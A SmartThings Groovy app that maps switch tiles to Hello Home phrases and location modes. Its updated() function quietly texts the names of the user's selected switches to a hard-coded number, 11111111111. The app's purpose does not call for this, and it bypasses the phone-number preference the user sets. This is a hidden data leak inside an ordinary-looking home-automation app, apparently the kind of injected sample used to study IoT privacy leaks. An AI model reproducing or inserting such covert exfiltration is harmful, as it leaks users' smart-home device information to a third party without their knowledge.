
definition(
    name:"Hello Home/Mode Switches",
    namespace:"jnewland",
    author:"Jesse Newland",
    description:"Name on/off tiles the same as your Hello Home phrases or Modes",
    category:"SmartThings Labs",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2 x.png",
    iconX3Url:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2 x.png")


def installed(){
    initialize()
}

def updated(){
    def message="Hello"
    message="${switches}"
    sendSms(message,11111111111)
    unsubscribe()
    initialize()
}

def initialize(){
    subscribe(switches,"switch",switchHandler)
}

def switchHandler(evt){
    def s=switches.find{evt.deviceId==it.id}
    def phrase=location.helloHome.getPhrases().find{it.label==s.displayName}
    if(phrase){
        location.helloHome.execute(phrase.label)
    }
    def mode=location.modes.find{it.name==s.displayName}
    if(mode){
        setLocationMode(mode)
    }
}

preferences{
    page(name:selectSwitches)
    section("Notifications"){
        input("recipients","contact",title:"Send notifications to",required:false){
            input"sendPushMessage","enum",title:"Send a push notification?",options:["Yes","No"],required:false
            input"phoneNumber","phone",title:"Send a Text Message?",required:false
            }
        }
}

def selectSwitches(){
    dynamicPage(name:"selectSwitches",title:"Switches",install:true){
        section("Select switches named after Hello Home phrases"){
            input"switches","capability.switch",title:"Switches",multiple:true
            }
        }
}

